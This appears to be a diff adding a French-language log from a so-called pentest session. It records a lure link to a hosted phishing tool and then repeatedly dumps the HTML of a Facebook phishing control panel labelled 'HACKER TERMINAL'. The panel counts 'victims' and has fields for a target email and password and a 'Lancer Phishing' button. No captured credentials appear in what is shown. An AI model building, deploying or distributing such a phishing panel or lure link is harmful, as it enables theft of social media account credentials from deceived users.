@@ -1,0 +1,1112 @@
+=== SESSION PENTEST Mon Mar  9 06:34:31 CAT 2026 ===
+Lien envoyé: https://leofish-tool-v1-0.onrender.com/index.php/index.php?session=1773030871_35f221020f6601c2
+06:35:23 - <!DOCTYPE html>
+06:35:23 - <html>
+06:35:23 - <head>
+06:35:23 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:23 -     <meta http-equiv="refresh" content="5">
+06:35:23 -     <style>
+06:35:23 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:23 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:23 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:23 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:23 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:23 -         .email{color:#ff0;font-weight:bold;}
+06:35:23 -         .ip{color:#0ff;}
+06:35:23 -         .time{color:#ff6600;}
+06:35:23 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:23 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:23 -         .btn:hover{background:#0a0;}
+06:35:23 -         .btn-red{background:#f00;color:#fff;}
+06:35:23 -     </style>
+06:35:23 - </head>
+06:35:23 - <body>
+06:35:23 -     <div class="header">
+06:35:23 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:23 -     </div>
+06:35:23 -     <div class="console" id="console">
+06:35:23 -             </div>
+06:35:23 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:23 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:24 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:24 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:24 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:24 -     </form>
+06:35:24 -     <script>
+06:35:24 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:24 -     </script>
+06:35:24 - </body>
+06:35:24 - </html>
+06:35:25 - <!DOCTYPE html>
+06:35:25 - <html>
+06:35:25 - <head>
+06:35:25 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:25 -     <meta http-equiv="refresh" content="5">
+06:35:25 -     <style>
+06:35:25 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:25 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:25 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:25 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:25 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:25 -         .email{color:#ff0;font-weight:bold;}
+06:35:25 -         .ip{color:#0ff;}
+06:35:25 -         .time{color:#ff6600;}
+06:35:25 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:25 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:25 -         .btn:hover{background:#0a0;}
+06:35:25 -         .btn-red{background:#f00;color:#fff;}
+06:35:25 -     </style>
+06:35:25 - </head>
+06:35:25 - <body>
+06:35:25 -     <div class="header">
+06:35:25 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:25 -     </div>
+06:35:25 -     <div class="console" id="console">
+06:35:25 -             </div>
+06:35:25 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:25 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:25 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:25 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:25 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:25 -     </form>
+06:35:25 -     <script>
+06:35:25 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:25 -     </script>
+06:35:25 - </body>
+06:35:25 - </html>
+06:35:26 - <!DOCTYPE html>
+06:35:26 - <html>
+06:35:26 - <head>
+06:35:26 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:26 -     <meta http-equiv="refresh" content="5">
+06:35:27 -     <style>
+06:35:27 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:27 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:27 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:27 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:27 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:27 -         .email{color:#ff0;font-weight:bold;}
+06:35:27 -         .ip{color:#0ff;}
+06:35:27 -         .time{color:#ff6600;}
+06:35:27 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:27 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:27 -         .btn:hover{background:#0a0;}
+06:35:27 -         .btn-red{background:#f00;color:#fff;}
+06:35:27 -     </style>
+06:35:27 - </head>
+06:35:27 - <body>
+06:35:27 -     <div class="header">
+06:35:27 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:27 -     </div>
+06:35:27 -     <div class="console" id="console">
+06:35:27 -             </div>
+06:35:27 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:27 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:27 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:27 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:27 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:27 -     </form>
+06:35:27 -     <script>
+06:35:27 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:27 -     </script>
+06:35:27 - </body>
+06:35:27 - </html>
+06:35:28 - <!DOCTYPE html>
+06:35:28 - <html>
+06:35:28 - <head>
+06:35:28 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:28 -     <meta http-equiv="refresh" content="5">
+06:35:28 -     <style>
+06:35:28 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:28 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:28 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:28 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:28 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:28 -         .email{color:#ff0;font-weight:bold;}
+06:35:28 -         .ip{color:#0ff;}
+06:35:28 -         .time{color:#ff6600;}
+06:35:28 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:28 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:28 -         .btn:hover{background:#0a0;}
+06:35:28 -         .btn-red{background:#f00;color:#fff;}
+06:35:28 -     </style>
+06:35:28 - </head>
+06:35:28 - <body>
+06:35:28 -     <div class="header">
+06:35:28 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:28 -     </div>
+06:35:28 -     <div class="console" id="console">
+06:35:28 -             </div>
+06:35:28 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:28 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:28 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:28 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:28 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:28 -     </form>
+06:35:28 -     <script>
+06:35:28 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:28 -     </script>
+06:35:28 - </body>
+06:35:28 - </html>
+06:35:29 - <!DOCTYPE html>
+06:35:29 - <html>
+06:35:29 - <head>
+06:35:29 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:29 -     <meta http-equiv="refresh" content="5">
+06:35:29 -     <style>
+06:35:29 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:29 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:29 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:29 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:29 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:29 -         .email{color:#ff0;font-weight:bold;}
+06:35:29 -         .ip{color:#0ff;}
+06:35:29 -         .time{color:#ff6600;}
+06:35:29 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:29 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:29 -         .btn:hover{background:#0a0;}
+06:35:29 -         .btn-red{background:#f00;color:#fff;}
+06:35:29 -     </style>
+06:35:29 - </head>
+06:35:29 - <body>
+06:35:29 -     <div class="header">
+06:35:29 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:29 -     </div>
+06:35:29 -     <div class="console" id="console">
+06:35:29 -             </div>
+06:35:29 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:29 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:29 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:29 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:29 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:29 -     </form>
+06:35:29 -     <script>
+06:35:29 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:29 -     </script>
+06:35:29 - </body>
+06:35:29 - </html>
+06:35:30 - <!DOCTYPE html>
+06:35:30 - <html>
+06:35:30 - <head>
+06:35:30 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:30 -     <meta http-equiv="refresh" content="5">
+06:35:30 -     <style>
+06:35:30 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:30 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:30 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:30 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:30 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:30 -         .email{color:#ff0;font-weight:bold;}
+06:35:30 -         .ip{color:#0ff;}
+06:35:30 -         .time{color:#ff6600;}
+06:35:30 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:30 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:30 -         .btn:hover{background:#0a0;}
+06:35:30 -         .btn-red{background:#f00;color:#fff;}
+06:35:30 -     </style>
+06:35:30 - </head>
+06:35:30 - <body>
+06:35:30 -     <div class="header">
+06:35:30 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:30 -     </div>
+06:35:30 -     <div class="console" id="console">
+06:35:30 -             </div>
+06:35:30 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:30 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:30 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:31 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:31 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:31 -     </form>
+06:35:31 -     <script>
+06:35:31 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:31 -     </script>
+06:35:31 - </body>
+06:35:31 - </html>
+06:35:32 - <!DOCTYPE html>
+06:35:32 - <html>
+06:35:32 - <head>
+06:35:32 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:32 -     <meta http-equiv="refresh" content="5">
+06:35:32 -     <style>
+06:35:32 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:32 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:32 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:32 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:32 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:32 -         .email{color:#ff0;font-weight:bold;}
+06:35:32 -         .ip{color:#0ff;}
+06:35:32 -         .time{color:#ff6600;}
+06:35:32 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:32 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:32 -         .btn:hover{background:#0a0;}
+06:35:32 -         .btn-red{background:#f00;color:#fff;}
+06:35:32 -     </style>
+06:35:32 - </head>
+06:35:32 - <body>
+06:35:32 -     <div class="header">
+06:35:32 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:32 -     </div>
+06:35:32 -     <div class="console" id="console">
+06:35:32 -             </div>
+06:35:32 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:32 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:32 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:32 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:32 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:32 -     </form>
+06:35:32 -     <script>
+06:35:32 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:32 -     </script>
+06:35:32 - </body>
+06:35:32 - </html>
+06:35:33 - <!DOCTYPE html>
+06:35:33 - <html>
+06:35:33 - <head>
+06:35:33 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:33 -     <meta http-equiv="refresh" content="5">
+06:35:33 -     <style>
+06:35:33 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:33 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:33 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:33 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:33 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:33 -         .email{color:#ff0;font-weight:bold;}
+06:35:33 -         .ip{color:#0ff;}
+06:35:33 -         .time{color:#ff6600;}
+06:35:33 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:33 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:33 -         .btn:hover{background:#0a0;}
+06:35:33 -         .btn-red{background:#f00;color:#fff;}
+06:35:33 -     </style>
+06:35:33 - </head>
+06:35:33 - <body>
+06:35:33 -     <div class="header">
+06:35:33 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:33 -     </div>
+06:35:33 -     <div class="console" id="console">
+06:35:33 -             </div>
+06:35:33 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:33 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:33 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:33 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:33 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:33 -     </form>
+06:35:33 -     <script>
+06:35:33 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:33 -     </script>
+06:35:33 - </body>
+06:35:33 - </html>
+06:35:34 - <!DOCTYPE html>
+06:35:34 - <html>
+06:35:34 - <head>
+06:35:34 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:34 -     <meta http-equiv="refresh" content="5">
+06:35:34 -     <style>
+06:35:34 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:34 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:34 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:34 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:34 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:34 -         .email{color:#ff0;font-weight:bold;}
+06:35:34 -         .ip{color:#0ff;}
+06:35:34 -         .time{color:#ff6600;}
+06:35:34 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:34 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:34 -         .btn:hover{background:#0a0;}
+06:35:34 -         .btn-red{background:#f00;color:#fff;}
+06:35:34 -     </style>
+06:35:34 - </head>
+06:35:34 - <body>
+06:35:34 -     <div class="header">
+06:35:34 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:34 -     </div>
+06:35:34 -     <div class="console" id="console">
+06:35:34 -             </div>
+06:35:34 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:34 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:34 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:34 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:34 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:34 -     </form>
+06:35:34 -     <script>
+06:35:34 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:34 -     </script>
+06:35:34 - </body>
+06:35:34 - </html>
+06:35:35 - <!DOCTYPE html>
+06:35:35 - <html>
+06:35:35 - <head>
+06:35:35 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:35 -     <meta http-equiv="refresh" content="5">
+06:35:35 -     <style>
+06:35:35 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:35 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:35 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:35 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:35 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:35 -         .email{color:#ff0;font-weight:bold;}
+06:35:35 -         .ip{color:#0ff;}
+06:35:35 -         .time{color:#ff6600;}
+06:35:35 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:35 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:35 -         .btn:hover{background:#0a0;}
+06:35:35 -         .btn-red{background:#f00;color:#fff;}
+06:35:35 -     </style>
+06:35:35 - </head>
+06:35:35 - <body>
+06:35:35 -     <div class="header">
+06:35:35 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:35 -     </div>
+06:35:35 -     <div class="console" id="console">
+06:35:35 -             </div>
+06:35:35 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:35 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:35 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:35 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:35 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:35 -     </form>
+06:35:35 -     <script>
+06:35:35 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:35 -     </script>
+06:35:35 - </body>
+06:35:35 - </html>
+06:35:36 - <!DOCTYPE html>
+06:35:36 - <html>
+06:35:36 - <head>
+06:35:36 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:36 -     <meta http-equiv="refresh" content="5">
+06:35:36 -     <style>
+06:35:36 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:36 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:36 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:36 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:36 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:36 -         .email{color:#ff0;font-weight:bold;}
+06:35:36 -         .ip{color:#0ff;}
+06:35:36 -         .time{color:#ff6600;}
+06:35:36 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:36 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:36 -         .btn:hover{background:#0a0;}
+06:35:36 -         .btn-red{background:#f00;color:#fff;}
+06:35:36 -     </style>
+06:35:36 - </head>
+06:35:36 - <body>
+06:35:36 -     <div class="header">
+06:35:36 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:36 -     </div>
+06:35:36 -     <div class="console" id="console">
+06:35:36 -             </div>
+06:35:36 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:36 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:36 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:36 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:36 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:36 -     </form>
+06:35:36 -     <script>
+06:35:36 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:36 -     </script>
+06:35:36 - </body>
+06:35:36 - </html>
+06:35:37 - <!DOCTYPE html>
+06:35:37 - <html>
+06:35:37 - <head>
+06:35:37 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:37 -     <meta http-equiv="refresh" content="5">
+06:35:37 -     <style>
+06:35:37 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:37 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:37 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:37 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:37 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:37 -         .email{color:#ff0;font-weight:bold;}
+06:35:37 -         .ip{color:#0ff;}
+06:35:37 -         .time{color:#ff6600;}
+06:35:37 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:37 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:37 -         .btn:hover{background:#0a0;}
+06:35:37 -         .btn-red{background:#f00;color:#fff;}
+06:35:37 -     </style>
+06:35:37 - </head>
+06:35:37 - <body>
+06:35:37 -     <div class="header">
+06:35:37 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:37 -     </div>
+06:35:37 -     <div class="console" id="console">
+06:35:37 -             </div>
+06:35:37 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:37 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:37 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:37 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:37 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:37 -     </form>
+06:35:37 -     <script>
+06:35:37 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:37 -     </script>
+06:35:37 - </body>
+06:35:38 - </html>
+06:35:39 - <!DOCTYPE html>
+06:35:39 - <html>
+06:35:39 - <head>
+06:35:39 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:39 -     <meta http-equiv="refresh" content="5">
+06:35:39 -     <style>
+06:35:39 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:39 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:39 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:39 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:39 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:39 -         .email{color:#ff0;font-weight:bold;}
+06:35:39 -         .ip{color:#0ff;}
+06:35:39 -         .time{color:#ff6600;}
+06:35:39 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:39 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:39 -         .btn:hover{background:#0a0;}
+06:35:39 -         .btn-red{background:#f00;color:#fff;}
+06:35:39 -     </style>
+06:35:39 - </head>
+06:35:39 - <body>
+06:35:39 -     <div class="header">
+06:35:39 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:39 -     </div>
+06:35:39 -     <div class="console" id="console">
+06:35:39 -             </div>
+06:35:39 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:39 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:39 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:39 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:39 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:39 -     </form>
+06:35:39 -     <script>
+06:35:39 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:39 -     </script>
+06:35:39 - </body>
+06:35:39 - </html>
+06:35:40 - <!DOCTYPE html>
+06:35:40 - <html>
+06:35:40 - <head>
+06:35:40 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:40 -     <meta http-equiv="refresh" content="5">
+06:35:40 -     <style>
+06:35:40 -         *{margin:0;padding:0;box-sizing:border-box;}
